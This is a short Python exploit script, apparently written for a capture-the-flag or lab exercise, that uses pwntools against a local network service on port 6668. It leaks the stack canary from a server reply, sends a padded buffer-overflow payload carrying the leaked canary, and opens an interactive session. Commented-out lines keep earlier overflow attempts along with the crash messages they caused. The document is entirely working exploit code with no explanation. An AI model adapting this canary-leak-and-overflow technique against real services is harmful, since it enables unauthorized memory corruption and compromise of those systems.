#!/usr/bin/python3
from pwn import *

client = remote("localhost",6668)

client.sendline(b'L TABLE XXXXX')
canary = client.recv()[104:112]
canary = p64(u64(canary))
print(canary)

client.sendline(b'L TABLE CHAIR') #must connect first
print(client.recv())

client.sendline(b'Q '+ b'A'*256 + canary) # 

#NOT ENTERING A PASSWORD, but only FAKE username
#client.send(b'L '+ b'A'*200 + canary + p64(0x7)) # *** buffer overflow detected ***: terminated

#client.sendline(b'L TABLE '+  b'A'*168 + canary+ p64(0x5)+b'Z'*8+ p64(0x3)+b'Y'*5000) # stack smashing

print(client.recv())

client.interactive()
